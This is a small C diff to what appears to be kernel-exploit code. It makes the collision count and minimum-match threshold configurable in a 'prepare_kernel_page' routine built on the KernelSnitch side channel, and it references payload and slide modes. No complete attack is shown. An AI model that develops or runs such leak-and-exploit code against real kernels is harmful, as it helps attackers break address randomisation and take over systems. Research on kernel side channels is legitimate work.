@@ -2087,9 +2087,14 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+#if defined(KERNEL_PAGE_KSNITCH_COLLISIONS)
+  size_t kernel_page_collisions = KERNEL_PAGE_KSNITCH_COLLISIONS;
+#else
+  size_t kernel_page_collisions = KSNITCH_COLLISIONS;
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, kernel_page_collisions,
       KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(APP_KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
@@ -2109,7 +2114,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   configure_kernelsnitch_profile(ks, payload_mode);
 #else
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, kernel_page_collisions, 0, 0);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
@@ -2119,6 +2124,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
         SLIDE_KSNITCH_AVERAGE);
   }
 #endif
+#endif
+#if defined(KERNEL_PAGE_KSNITCH_MIN_MATCHES)
+  kernelsnitch_set_min_collision_matches(
+      ks, KERNEL_PAGE_KSNITCH_MIN_MATCHES);
+  pr_info("kernel page KernelSnitch collisions=%zu min_matches=%d\n",
+          kernel_page_collisions, KERNEL_PAGE_KSNITCH_MIN_MATCHES);
 #endif
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
